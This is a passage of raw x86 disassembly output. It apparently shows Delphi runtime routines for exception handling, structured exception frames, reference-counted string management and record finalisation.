  402fd5:	74 26                	je     0x402ffd
  402fd7:	eb 2c                	jmp    0x403005
  402fd9:	b0 c8                	mov    $0xc8,%al
  402fdb:	eb 2a                	jmp    0x403007
  402fdd:	b0 c9                	mov    $0xc9,%al
  402fdf:	eb 26                	jmp    0x403007
  402fe1:	b0 cd                	mov    $0xcd,%al
  402fe3:	eb 22                	jmp    0x403007
  402fe5:	b0 cf                	mov    $0xcf,%al
  402fe7:	eb 1e                	jmp    0x403007
  402fe9:	b0 c8                	mov    $0xc8,%al
  402feb:	eb 1a                	jmp    0x403007
  402fed:	b0 d7                	mov    $0xd7,%al
  402fef:	eb 16                	jmp    0x403007
  402ff1:	b0 ce                	mov    $0xce,%al
  402ff3:	eb 12                	jmp    0x403007
  402ff5:	b0 d8                	mov    $0xd8,%al
  402ff7:	eb 0e                	jmp    0x403007
  402ff9:	b0 da                	mov    $0xda,%al
  402ffb:	eb 0a                	jmp    0x403007
  402ffd:	b0 d9                	mov    $0xd9,%al
  402fff:	eb 06                	jmp    0x403007
  403001:	b0 ca                	mov    $0xca,%al
  403003:	eb 02                	jmp    0x403007
  403005:	b0 d9                	mov    $0xd9,%al
  403007:	25 ff 00 00 00       	and    $0xff,%eax
  40300c:	8b 52 0c             	mov    0xc(%edx),%edx
  40300f:	e8 58 ff ff ff       	call   0x402f6c
  403014:	5d                   	pop    %ebp
  403015:	c2 04 00             	ret    $0x4
  403018:	8b 44 24 04          	mov    0x4(%esp),%eax
  40301c:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403023:	75 6b                	jne    0x403090
  403025:	e8 32 f8 ff ff       	call   0x40285c
  40302a:	8b 54 24 08          	mov    0x8(%esp),%edx
  40302e:	6a 00                	push   $0x0
  403030:	50                   	push   %eax
  403031:	68 3c 30 40 00       	push   $0x40303c
  403036:	52                   	push   %edx
  403037:	e8 90 e1 ff ff       	call   0x4011cc
  40303c:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  403040:	81 3b ce fa ed 0e    	cmpl   $0xeedface,(%ebx)
  403046:	8b 53 14             	mov    0x14(%ebx),%edx
  403049:	8b 43 18             	mov    0x18(%ebx),%eax
  40304c:	74 1d                	je     0x40306b
  40304e:	8b 15 0c c0 40 00    	mov    0x40c00c,%edx
  403054:	85 d2                	test   %edx,%edx
  403056:	0f 84 1c ff ff ff    	je     0x402f78
  40305c:	89 d8                	mov    %ebx,%eax
  40305e:	ff d2                	call   *%edx
  403060:	85 c0                	test   %eax,%eax
  403062:	0f 84 10 ff ff ff    	je     0x402f78
  403068:	8b 53 0c             	mov    0xc(%ebx),%edx
  40306b:	e8 78 fb ff ff       	call   0x402be8
  403070:	8b 0d 00 c0 40 00    	mov    0x40c000,%ecx
  403076:	85 c9                	test   %ecx,%ecx
  403078:	74 02                	je     0x40307c
  40307a:	ff d1                	call   *%ecx
  40307c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403080:	b8 d9 00 00 00       	mov    $0xd9,%eax
  403085:	8b 51 14             	mov    0x14(%ecx),%edx
  403088:	89 14 24             	mov    %edx,(%esp)
  40308b:	e9 b1 0d 00 00       	jmp    0x403e41
  403090:	31 c0                	xor    %eax,%eax
  403092:	c3                   	ret
  403093:	90                   	nop
  403094:	31 d2                	xor    %edx,%edx
  403096:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403099:	64 8b 0a             	mov    %fs:(%edx),%ecx
  40309c:	64 89 02             	mov    %eax,%fs:(%edx)
  40309f:	89 08                	mov    %ecx,(%eax)
  4030a1:	c7 40 04 18 30 40 00 	movl   $0x403018,0x4(%eax)
  4030a8:	89 68 08             	mov    %ebp,0x8(%eax)
  4030ab:	89 05 88 c4 40 00    	mov    %eax,0x40c488
  4030b1:	c3                   	ret
  4030b2:	8b c0                	mov    %eax,%eax
  4030b4:	31 d2                	xor    %edx,%edx
  4030b6:	8b 05 88 c4 40 00    	mov    0x40c488,%eax
  4030bc:	64 8b 0a             	mov    %fs:(%edx),%ecx
  4030bf:	39 c8                	cmp    %ecx,%eax
  4030c1:	75 08                	jne    0x4030cb
  4030c3:	8b 00                	mov    (%eax),%eax
  4030c5:	64 89 02             	mov    %eax,%fs:(%edx)
  4030c8:	c3                   	ret
  4030c9:	8b 09                	mov    (%ecx),%ecx
  4030cb:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4030ce:	74 08                	je     0x4030d8
  4030d0:	39 01                	cmp    %eax,(%ecx)
  4030d2:	75 f5                	jne    0x4030c9
  4030d4:	8b 00                	mov    (%eax),%eax
  4030d6:	89 01                	mov    %eax,(%ecx)
  4030d8:	c3                   	ret
  4030d9:	8d 40 00             	lea    0x0(%eax),%eax
  4030dc:	e8 b3 ff ff ff       	call   0x403094
  4030e1:	6a 00                	push   $0x0
  4030e3:	e8 14 e1 ff ff       	call   0x4011fc
  4030e8:	89 05 14 c0 40 00    	mov    %eax,0x40c014
  4030ee:	e8 f9 e0 ff ff       	call   0x4011ec
  4030f3:	89 05 1c c0 40 00    	mov    %eax,0x40c01c
  4030f9:	c7 05 18 c0 40 00 0a 	movl   $0xa,0x40c018
  403100:	00 00 00 
  403103:	b8 34 2e 40 00       	mov    $0x402e34,%eax
  403108:	c3                   	ret
  403109:	8d 40 00             	lea    0x0(%eax),%eax
  40310c:	53                   	push   %ebx
  40310d:	83 3d d0 c3 40 00 00 	cmpl   $0x0,0x40c3d0
  403114:	7d 0a                	jge    0x403120
  403116:	b8 e2 00 00 00       	mov    $0xe2,%eax
  40311b:	e8 21 0d 00 00       	call   0x403e41
  403120:	68 08 00 00 00       	push   $0x8
  403125:	6a 40                	push   $0x40
  403127:	e8 20 e1 ff ff       	call   0x40124c
  40312c:	8b d8                	mov    %eax,%ebx
  40312e:	85 db                	test   %ebx,%ebx
  403130:	75 0c                	jne    0x40313e
  403132:	b8 e2 00 00 00       	mov    $0xe2,%eax
  403137:	e8 05 0d 00 00       	call   0x403e41
  40313c:	eb 0c                	jmp    0x40314a
  40313e:	53                   	push   %ebx
  40313f:	a1 d0 c3 40 00       	mov    0x40c3d0,%eax
  403144:	50                   	push   %eax
  403145:	e8 ca e0 ff ff       	call   0x401214
  40314a:	89 1d 8c c4 40 00    	mov    %ebx,0x40c48c
  403150:	5b                   	pop    %ebx
  403151:	c3                   	ret
  403152:	8b c0                	mov    %eax,%eax
  403154:	8a 0d 30 c0 40 00    	mov    0x40c030,%cl
  40315a:	8b 05 d0 c3 40 00    	mov    0x40c3d0,%eax
  403160:	84 c9                	test   %cl,%cl
  403162:	75 28                	jne    0x40318c
  403164:	64 8b 15 2c 00 00 00 	mov    %fs:0x2c,%edx
  40316b:	8b 04 82             	mov    (%edx,%eax,4),%eax
  40316e:	c3                   	ret
  40316f:	e8 98 ff ff ff       	call   0x40310c
  403174:	8b 05 d0 c3 40 00    	mov    0x40c3d0,%eax
  40317a:	50                   	push   %eax
  40317b:	e8 8c e0 ff ff       	call   0x40120c
  403180:	85 c0                	test   %eax,%eax
  403182:	74 01                	je     0x403185
  403184:	c3                   	ret
  403185:	8b 05 8c c4 40 00    	mov    0x40c48c,%eax
  40318b:	c3                   	ret
  40318c:	50                   	push   %eax
  40318d:	e8 7a e0 ff ff       	call   0x40120c
  403192:	85 c0                	test   %eax,%eax
  403194:	74 d9                	je     0x40316f
  403196:	c3                   	ret
  403197:	90                   	nop
  403198:	8b 10                	mov    (%eax),%edx
  40319a:	85 d2                	test   %edx,%edx
  40319c:	74 19                	je     0x4031b7
  40319e:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4031a4:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4031a7:	49                   	dec    %ecx
  4031a8:	7c 0d                	jl     0x4031b7
  4031aa:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4031ad:	75 08                	jne    0x4031b7
  4031af:	8d 42 f8             	lea    -0x8(%edx),%eax
  4031b2:	e8 f5 f3 ff ff       	call   0x4025ac
  4031b7:	c3                   	ret
  4031b8:	53                   	push   %ebx
  4031b9:	56                   	push   %esi
  4031ba:	89 c3                	mov    %eax,%ebx
  4031bc:	89 d6                	mov    %edx,%esi
  4031be:	8b 13                	mov    (%ebx),%edx
  4031c0:	85 d2                	test   %edx,%edx
  4031c2:	74 19                	je     0x4031dd
  4031c4:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  4031ca:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4031cd:	49                   	dec    %ecx
  4031ce:	7c 0d                	jl     0x4031dd
  4031d0:	89 4a f8             	mov    %ecx,-0x8(%edx)
  4031d3:	75 08                	jne    0x4031dd
  4031d5:	8d 42 f8             	lea    -0x8(%edx),%eax
  4031d8:	e8 cf f3 ff ff       	call   0x4025ac
  4031dd:	83 c3 04             	add    $0x4,%ebx
  4031e0:	4e                   	dec    %esi
  4031e1:	75 db                	jne    0x4031be
  4031e3:	5e                   	pop    %esi
  4031e4:	5b                   	pop    %ebx
  4031e5:	c3                   	ret
  4031e6:	8b c0                	mov    %eax,%eax
  4031e8:	85 d2                	test   %edx,%edx
  4031ea:	74 23                	je     0x40320f
  4031ec:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4031ef:	41                   	inc    %ecx
  4031f0:	7f 1a                	jg     0x40320c
  4031f2:	50                   	push   %eax
  4031f3:	52                   	push   %edx
  4031f4:	8b 42 fc             	mov    -0x4(%edx),%eax
  4031f7:	e8 58 00 00 00       	call   0x403254
  4031fc:	89 c2                	mov    %eax,%edx
  4031fe:	58                   	pop    %eax
  4031ff:	52                   	push   %edx
  403200:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403203:	e8 7c f4 ff ff       	call   0x402684
  403208:	5a                   	pop    %edx
  403209:	58                   	pop    %eax
  40320a:	eb 03                	jmp    0x40320f
  40320c:	89 4a f8             	mov    %ecx,-0x8(%edx)
  40320f:	87 10                	xchg   %edx,(%eax)
  403211:	85 d2                	test   %edx,%edx
  403213:	74 13                	je     0x403228
  403215:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403218:	49                   	dec    %ecx
  403219:	7c 0d                	jl     0x403228
  40321b:	89 4a f8             	mov    %ecx,-0x8(%edx)
  40321e:	75 08                	jne    0x403228
  403220:	8d 42 f8             	lea    -0x8(%edx),%eax
  403223:	e8 84 f3 ff ff       	call   0x4025ac
  403228:	c3                   	ret
  403229:	8d 40 00             	lea    0x0(%eax),%eax
  40322c:	85 d2                	test   %edx,%edx
  40322e:	74 09                	je     0x403239
  403230:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403233:	41                   	inc    %ecx
  403234:	7e 03                	jle    0x403239
  403236:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403239:	87 10                	xchg   %edx,(%eax)
  40323b:	85 d2                	test   %edx,%edx
  40323d:	74 13                	je     0x403252
  40323f:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403242:	49                   	dec    %ecx
  403243:	7c 0d                	jl     0x403252
  403245:	89 4a f8             	mov    %ecx,-0x8(%edx)
  403248:	75 08                	jne    0x403252
  40324a:	8d 42 f8             	lea    -0x8(%edx),%eax
  40324d:	e8 5a f3 ff ff       	call   0x4025ac
  403252:	c3                   	ret
  403253:	90                   	nop
  403254:	85 c0                	test   %eax,%eax
  403256:	7e 1c                	jle    0x403274
  403258:	50                   	push   %eax
  403259:	83 c0 09             	add    $0x9,%eax
  40325c:	e8 33 f3 ff ff       	call   0x402594
  403261:	83 c0 08             	add    $0x8,%eax
  403264:	5a                   	pop    %edx
  403265:	89 50 fc             	mov    %edx,-0x4(%eax)
  403268:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  40326f:	c6 04 10 00          	movb   $0x0,(%eax,%edx,1)
  403273:	c3                   	ret
  403274:	31 c0                	xor    %eax,%eax
  403276:	c3                   	ret
  403277:	90                   	nop
  403278:	53                   	push   %ebx
  403279:	56                   	push   %esi
  40327a:	57                   	push   %edi
  40327b:	89 c3                	mov    %eax,%ebx
  40327d:	89 d6                	mov    %edx,%esi
  40327f:	89 cf                	mov    %ecx,%edi
  403281:	89 f8                	mov    %edi,%eax
  403283:	e8 cc ff ff ff       	call   0x403254
  403288:	89 f9                	mov    %edi,%ecx
  40328a:	89 c7                	mov    %eax,%edi
  40328c:	85 f6                	test   %esi,%esi
  40328e:	74 09                	je     0x403299
  403290:	89 c2                	mov    %eax,%edx
  403292:	89 f0                	mov    %esi,%eax
  403294:	e8 eb f3 ff ff       	call   0x402684
  403299:	89 d8                	mov    %ebx,%eax
  40329b:	e8 f8 fe ff ff       	call   0x403198
  4032a0:	89 3b                	mov    %edi,(%ebx)
  4032a2:	5f                   	pop    %edi
  4032a3:	5e                   	pop    %esi
  4032a4:	5b                   	pop    %ebx
  4032a5:	c3                   	ret
  4032a6:	8b c0                	mov    %eax,%eax
  4032a8:	52                   	push   %edx
  4032a9:	89 e2                	mov    %esp,%edx
  4032ab:	b9 01 00 00 00       	mov    $0x1,%ecx
  4032b0:	e8 c3 ff ff ff       	call   0x403278
  4032b5:	5a                   	pop    %edx
  4032b6:	c3                   	ret
  4032b7:	90                   	nop
  4032b8:	31 c9                	xor    %ecx,%ecx
  4032ba:	8a 0a                	mov    (%edx),%cl
  4032bc:	42                   	inc    %edx
  4032bd:	e8 b6 ff ff ff       	call   0x403278
  4032c2:	c3                   	ret
  4032c3:	90                   	nop
  4032c4:	31 c9                	xor    %ecx,%ecx
  4032c6:	85 d2                	test   %edx,%edx
  4032c8:	74 21                	je     0x4032eb
  4032ca:	52                   	push   %edx
  4032cb:	3a 0a                	cmp    (%edx),%cl
  4032cd:	74 17                	je     0x4032e6
  4032cf:	3a 4a 01             	cmp    0x1(%edx),%cl
  4032d2:	74 11                	je     0x4032e5
  4032d4:	3a 4a 02             	cmp    0x2(%edx),%cl
  4032d7:	74 0b                	je     0x4032e4
  4032d9:	3a 4a 03             	cmp    0x3(%edx),%cl
  4032dc:	74 05                	je     0x4032e3
  4032de:	83 c2 04             	add    $0x4,%edx
  4032e1:	eb e8                	jmp    0x4032cb
  4032e3:	42                   	inc    %edx
  4032e4:	42                   	inc    %edx
  4032e5:	42                   	inc    %edx
  4032e6:	89 d1                	mov    %edx,%ecx
  4032e8:	5a                   	pop    %edx
  4032e9:	29 d1                	sub    %edx,%ecx
  4032eb:	e9 88 ff ff ff       	jmp    0x403278
  4032f0:	c3                   	ret
  4032f1:	8d 40 00             	lea    0x0(%eax),%eax
  4032f4:	85 c0                	test   %eax,%eax
  4032f6:	74 03                	je     0x4032fb
  4032f8:	8b 40 fc             	mov    -0x4(%eax),%eax
  4032fb:	c3                   	ret
  4032fc:	85 d2                	test   %edx,%edx
  4032fe:	74 3f                	je     0x40333f
  403300:	8b 08                	mov    (%eax),%ecx
  403302:	85 c9                	test   %ecx,%ecx
  403304:	0f 84 de fe ff ff    	je     0x4031e8
  40330a:	53                   	push   %ebx
  40330b:	56                   	push   %esi
  40330c:	57                   	push   %edi
  40330d:	89 c3                	mov    %eax,%ebx
  40330f:	89 d6                	mov    %edx,%esi
  403311:	8b 79 fc             	mov    -0x4(%ecx),%edi
  403314:	8b 56 fc             	mov    -0x4(%esi),%edx
  403317:	01 fa                	add    %edi,%edx
  403319:	39 ce                	cmp    %ecx,%esi
  40331b:	74 17                	je     0x403334
  40331d:	e8 ce 01 00 00       	call   0x4034f0
  403322:	89 f0                	mov    %esi,%eax
  403324:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403327:	8b 13                	mov    (%ebx),%edx
  403329:	01 fa                	add    %edi,%edx
  40332b:	e8 54 f3 ff ff       	call   0x402684
  403330:	5f                   	pop    %edi
  403331:	5e                   	pop    %esi
  403332:	5b                   	pop    %ebx
  403333:	c3                   	ret
  403334:	e8 b7 01 00 00       	call   0x4034f0
  403339:	8b 03                	mov    (%ebx),%eax
  40333b:	89 f9                	mov    %edi,%ecx
  40333d:	eb e8                	jmp    0x403327
  40333f:	c3                   	ret
  403340:	85 d2                	test   %edx,%edx
  403342:	74 61                	je     0x4033a5
  403344:	85 c9                	test   %ecx,%ecx
  403346:	0f 84 9c fe ff ff    	je     0x4031e8
  40334c:	3b 10                	cmp    (%eax),%edx
  40334e:	74 5c                	je     0x4033ac
  403350:	3b 08                	cmp    (%eax),%ecx
  403352:	74 0e                	je     0x403362
  403354:	50                   	push   %eax
  403355:	51                   	push   %ecx
  403356:	e8 8d fe ff ff       	call   0x4031e8
  40335b:	5a                   	pop    %edx
  40335c:	58                   	pop    %eax
  40335d:	e9 9a ff ff ff       	jmp    0x4032fc
  403362:	53                   	push   %ebx
  403363:	56                   	push   %esi
  403364:	57                   	push   %edi
  403365:	89 d3                	mov    %edx,%ebx
  403367:	89 ce                	mov    %ecx,%esi
  403369:	50                   	push   %eax
  40336a:	8b 43 fc             	mov    -0x4(%ebx),%eax
  40336d:	03 46 fc             	add    -0x4(%esi),%eax
  403370:	e8 df fe ff ff       	call   0x403254
  403375:	89 c7                	mov    %eax,%edi
  403377:	89 c2                	mov    %eax,%edx
  403379:	89 d8                	mov    %ebx,%eax
  40337b:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  40337e:	e8 01 f3 ff ff       	call   0x402684
  403383:	89 fa                	mov    %edi,%edx
  403385:	89 f0                	mov    %esi,%eax
  403387:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40338a:	03 53 fc             	add    -0x4(%ebx),%edx
  40338d:	e8 f2 f2 ff ff       	call   0x402684
  403392:	58                   	pop    %eax
  403393:	89 fa                	mov    %edi,%edx
  403395:	85 ff                	test   %edi,%edi
  403397:	74 03                	je     0x40339c
  403399:	ff 4f f8             	decl   -0x8(%edi)
  40339c:	e8 47 fe ff ff       	call   0x4031e8
  4033a1:	5f                   	pop    %edi
  4033a2:	5e                   	pop    %esi
  4033a3:	5b                   	pop    %ebx
  4033a4:	c3                   	ret
  4033a5:	89 ca                	mov    %ecx,%edx
  4033a7:	e9 3c fe ff ff       	jmp    0x4031e8
  4033ac:	89 ca                	mov    %ecx,%edx
  4033ae:	e9 49 ff ff ff       	jmp    0x4032fc
  4033b3:	c3                   	ret
  4033b4:	53                   	push   %ebx
  4033b5:	56                   	push   %esi
  4033b6:	52                   	push   %edx
  4033b7:	50                   	push   %eax
  4033b8:	89 d3                	mov    %edx,%ebx
  4033ba:	31 c0                	xor    %eax,%eax
  4033bc:	8b 4c 94 10          	mov    0x10(%esp,%edx,4),%ecx
  4033c0:	85 c9                	test   %ecx,%ecx
  4033c2:	74 03                	je     0x4033c7
  4033c4:	03 41 fc             	add    -0x4(%ecx),%eax
  4033c7:	4a                   	dec    %edx
  4033c8:	75 f2                	jne    0x4033bc
  4033ca:	e8 85 fe ff ff       	call   0x403254
  4033cf:	50                   	push   %eax
  4033d0:	89 c6                	mov    %eax,%esi
  4033d2:	8b 44 9c 14          	mov    0x14(%esp,%ebx,4),%eax
  4033d6:	89 f2                	mov    %esi,%edx
  4033d8:	85 c0                	test   %eax,%eax
  4033da:	74 0a                	je     0x4033e6
  4033dc:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4033df:	01 ce                	add    %ecx,%esi
  4033e1:	e8 9e f2 ff ff       	call   0x402684
  4033e6:	4b                   	dec    %ebx
  4033e7:	75 e9                	jne    0x4033d2
  4033e9:	5a                   	pop    %edx
  4033ea:	58                   	pop    %eax
  4033eb:	85 d2                	test   %edx,%edx
  4033ed:	74 03                	je     0x4033f2
  4033ef:	ff 4a f8             	decl   -0x8(%edx)
  4033f2:	e8 f1 fd ff ff       	call   0x4031e8
  4033f7:	5a                   	pop    %edx
  4033f8:	5e                   	pop    %esi
  4033f9:	5b                   	pop    %ebx
  4033fa:	58                   	pop    %eax
  4033fb:	8d 24 94             	lea    (%esp,%edx,4),%esp
  4033fe:	ff e0                	jmp    *%eax
  403400:	c3                   	ret
  403401:	8d 40 00             	lea    0x0(%eax),%eax
  403404:	85 c0                	test   %eax,%eax
  403406:	74 09                	je     0x403411
  403408:	8b 50 f8             	mov    -0x8(%eax),%edx
  40340b:	42                   	inc    %edx
  40340c:	7e 03                	jle    0x403411
  40340e:	89 50 f8             	mov    %edx,-0x8(%eax)
  403411:	c3                   	ret
  403412:	8b c0                	mov    %eax,%eax
  403414:	85 c0                	test   %eax,%eax
  403416:	74 02                	je     0x40341a
  403418:	c3                   	ret
  403419:	00 b8 19 34 40 00    	add    %bh,0x403419(%eax)
  40341f:	c3                   	ret
  403420:	8b 10                	mov    (%eax),%edx
  403422:	85 d2                	test   %edx,%edx
  403424:	74 2b                	je     0x403451
  403426:	8b 4a f8             	mov    -0x8(%edx),%ecx
  403429:	49                   	dec    %ecx
  40342a:	74 25                	je     0x403451
  40342c:	53                   	push   %ebx
  40342d:	89 c3                	mov    %eax,%ebx
  40342f:	8b 42 fc             	mov    -0x4(%edx),%eax
  403432:	e8 1d fe ff ff       	call   0x403254
  403437:	89 c2                	mov    %eax,%edx
  403439:	8b 03                	mov    (%ebx),%eax
  40343b:	89 13                	mov    %edx,(%ebx)
  40343d:	8b 48 f8             	mov    -0x8(%eax),%ecx
  403440:	49                   	dec    %ecx
  403441:	7c 03                	jl     0x403446
  403443:	89 48 f8             	mov    %ecx,-0x8(%eax)
  403446:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403449:	e8 36 f2 ff ff       	call   0x402684
  40344e:	8b 13                	mov    (%ebx),%edx
  403450:	5b                   	pop    %ebx
  403451:	89 d0                	mov    %edx,%eax
  403453:	c3                   	ret
  403454:	53                   	push   %ebx
  403455:	85 c0                	test   %eax,%eax
  403457:	74 2d                	je     0x403486
  403459:	8b 58 fc             	mov    -0x4(%eax),%ebx
  40345c:	85 db                	test   %ebx,%ebx
  40345e:	74 26                	je     0x403486
  403460:	4a                   	dec    %edx
  403461:	7c 1b                	jl     0x40347e
  403463:	39 da                	cmp    %ebx,%edx
  403465:	7d 1f                	jge    0x403486
  403467:	29 d3                	sub    %edx,%ebx
  403469:	85 c9                	test   %ecx,%ecx
  40346b:	7c 19                	jl     0x403486
  40346d:	39 d9                	cmp    %ebx,%ecx
  40346f:	7f 11                	jg     0x403482
  403471:	01 c2                	add    %eax,%edx
  403473:	8b 44 24 08          	mov    0x8(%esp),%eax
  403477:	e8 fc fd ff ff       	call   0x403278
  40347c:	eb 11                	jmp    0x40348f
  40347e:	31 d2                	xor    %edx,%edx
  403480:	eb e5                	jmp    0x403467
  403482:	89 d9                	mov    %ebx,%ecx
  403484:	eb eb                	jmp    0x403471
  403486:	8b 44 24 08          	mov    0x8(%esp),%eax
  40348a:	e8 09 fd ff ff       	call   0x403198
  40348f:	5b                   	pop    %ebx
  403490:	c2 04 00             	ret    $0x4
  403493:	c3                   	ret
  403494:	85 c0                	test   %eax,%eax
  403496:	74 56                	je     0x4034ee
  403498:	53                   	push   %ebx
  403499:	56                   	push   %esi
  40349a:	57                   	push   %edi
  40349b:	55                   	push   %ebp
  40349c:	89 c3                	mov    %eax,%ebx
  40349e:	89 d6                	mov    %edx,%esi
  4034a0:	89 cf                	mov    %ecx,%edi
  4034a2:	8b 12                	mov    (%edx),%edx
  4034a4:	52                   	push   %edx
  4034a5:	85 d2                	test   %edx,%edx
  4034a7:	74 03                	je     0x4034ac
  4034a9:	8b 52 fc             	mov    -0x4(%edx),%edx
  4034ac:	4f                   	dec    %edi
  4034ad:	7d 02                	jge    0x4034b1
  4034af:	31 ff                	xor    %edi,%edi
  4034b1:	39 d7                	cmp    %edx,%edi
  4034b3:	7e 02                	jle    0x4034b7
  4034b5:	89 d7                	mov    %edx,%edi
  4034b7:	8b 6b fc             	mov    -0x4(%ebx),%ebp
  4034ba:	89 f0                	mov    %esi,%eax
  4034bc:	01 ea                	add    %ebp,%edx
  4034be:	e8 2d 00 00 00       	call   0x4034f0
  4034c3:	58                   	pop    %eax
  4034c4:	39 d8                	cmp    %ebx,%eax
  4034c6:	75 02                	jne    0x4034ca
  4034c8:	8b 1e                	mov    (%esi),%ebx
  4034ca:	8b 06                	mov    (%esi),%eax
  4034cc:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  4034cf:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4034d2:	29 d1                	sub    %edx,%ecx
  4034d4:	01 c2                	add    %eax,%edx
  4034d6:	01 f8                	add    %edi,%eax
  4034d8:	e8 a7 f1 ff ff       	call   0x402684
  4034dd:	89 d8                	mov    %ebx,%eax
  4034df:	8b 16                	mov    (%esi),%edx
  4034e1:	89 e9                	mov    %ebp,%ecx
  4034e3:	01 fa                	add    %edi,%edx
  4034e5:	e8 9a f1 ff ff       	call   0x402684
  4034ea:	5d                   	pop    %ebp
  4034eb:	5f                   	pop    %edi
  4034ec:	5e                   	pop    %esi
  4034ed:	5b                   	pop    %ebx
  4034ee:	c3                   	ret
  4034ef:	90                   	nop
  4034f0:	53                   	push   %ebx
  4034f1:	56                   	push   %esi
  4034f2:	57                   	push   %edi
  4034f3:	89 c3                	mov    %eax,%ebx
  4034f5:	89 d6                	mov    %edx,%esi
  4034f7:	31 ff                	xor    %edi,%edi
  4034f9:	85 d2                	test   %edx,%edx
  4034fb:	74 48                	je     0x403545
  4034fd:	8b 03                	mov    (%ebx),%eax
  4034ff:	85 c0                	test   %eax,%eax
  403501:	74 23                	je     0x403526
  403503:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  403507:	75 1d                	jne    0x403526
  403509:	83 e8 08             	sub    $0x8,%eax
  40350c:	83 c2 09             	add    $0x9,%edx
  40350f:	50                   	push   %eax
  403510:	89 e0                	mov    %esp,%eax
  403512:	e8 ad f0 ff ff       	call   0x4025c4
  403517:	58                   	pop    %eax
  403518:	83 c0 08             	add    $0x8,%eax
  40351b:	89 03                	mov    %eax,(%ebx)
  40351d:	89 70 fc             	mov    %esi,-0x4(%eax)
  403520:	c6 04 30 00          	movb   $0x0,(%eax,%esi,1)
  403524:	eb 28                	jmp    0x40354e
  403526:	89 d0                	mov    %edx,%eax
  403528:	e8 27 fd ff ff       	call   0x403254
  40352d:	89 c7                	mov    %eax,%edi
  40352f:	8b 03                	mov    (%ebx),%eax
  403531:	85 c0                	test   %eax,%eax
  403533:	74 10                	je     0x403545
  403535:	89 fa                	mov    %edi,%edx
  403537:	8b 48 fc             	mov    -0x4(%eax),%ecx
  40353a:	39 f1                	cmp    %esi,%ecx
  40353c:	7c 02                	jl     0x403540
  40353e:	89 f1                	mov    %esi,%ecx
  403540:	e8 3f f1 ff ff       	call   0x402684
  403545:	89 d8                	mov    %ebx,%eax
  403547:	e8 4c fc ff ff       	call   0x403198
  40354c:	89 3b                	mov    %edi,(%ebx)
  40354e:	5f                   	pop    %edi
  40354f:	5e                   	pop    %esi
  403550:	5b                   	pop    %ebx
  403551:	c3                   	ret
  403552:	8b c0                	mov    %eax,%eax
  403554:	31 c9                	xor    %ecx,%ecx
  403556:	53                   	push   %ebx
  403557:	8a 4a 01             	mov    0x1(%edx),%cl
  40355a:	56                   	push   %esi
  40355b:	57                   	push   %edi
  40355c:	89 c3                	mov    %eax,%ebx
  40355e:	8d 74 0a 0a          	lea    0xa(%edx,%ecx,1),%esi
  403562:	8b 7c 0a 06          	mov    0x6(%edx,%ecx,1),%edi
  403566:	8b 46 04             	mov    0x4(%esi),%eax
  403569:	8b 16                	mov    (%esi),%edx
  40356b:	01 d8                	add    %ebx,%eax
  40356d:	e8 92 00 00 00       	call   0x403604
  403572:	83 c6 08             	add    $0x8,%esi
  403575:	4f                   	dec    %edi
  403576:	7f ee                	jg     0x403566
  403578:	5f                   	pop    %edi
  403579:	5e                   	pop    %esi
  40357a:	5b                   	pop    %ebx
  40357b:	c3                   	ret
  40357c:	53                   	push   %ebx
  40357d:	56                   	push   %esi
  40357e:	57                   	push   %edi
  40357f:	89 c3                	mov    %eax,%ebx
  403581:	89 d6                	mov    %edx,%esi
  403583:	89 cf                	mov    %ecx,%edi
  403585:	31 d2                	xor    %edx,%edx
  403587:	8a 06                	mov    (%esi),%al
  403589:	8a 56 01             	mov    0x1(%esi),%dl
  40358c:	80 f8 0a             	cmp    $0xa,%al
  40358f:	74 19                	je     0x4035aa
  403591:	80 f8 0c             	cmp    $0xc,%al
  403594:	74 2b                	je     0x4035c1
  403596:	80 f8 0d             	cmp    $0xd,%al
  403599:	74 35                	je     0x4035d0
  40359b:	80 f8 0e             	cmp    $0xe,%al
  40359e:	74 4c                	je     0x4035ec
  4035a0:	b0 02                	mov    $0x2,%al
  4035a2:	5f                   	pop    %edi
  4035a3:	5e                   	pop    %esi
  4035a4:	5b                   	pop    %ebx
  4035a5:	e9 6a f0 ff ff       	jmp    0x402614
  4035aa:	83 f9 01             	cmp    $0x1,%ecx
  4035ad:	89 d8                	mov    %ebx,%eax
  4035af:	7f 07                	jg     0x4035b8
  4035b1:	e8 e2 fb ff ff       	call   0x403198
  4035b6:	eb 48                	jmp    0x403600
  4035b8:	89 ca                	mov    %ecx,%edx
  4035ba:	e8 f9 fb ff ff       	call   0x4031b8
  4035bf:	eb 3f                	jmp    0x403600
  4035c1:	89 d8                	mov    %ebx,%eax
  4035c3:	83 c3 10             	add    $0x10,%ebx
  4035c6:	e8 15 04 00 00       	call   0x4039e0
  4035cb:	4f                   	dec    %edi
  4035cc:	7f f3                	jg     0x4035c1
  4035ce:	eb 30                	jmp    0x403600
  4035d0:	55                   	push   %ebp
  4035d1:	89 d5                	mov    %edx,%ebp
  4035d3:	89 d8                	mov    %ebx,%eax
  4035d5:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  4035d9:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  4035dd:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  4035e1:	e8 96 ff ff ff       	call   0x40357c
  4035e6:	4f                   	dec    %edi
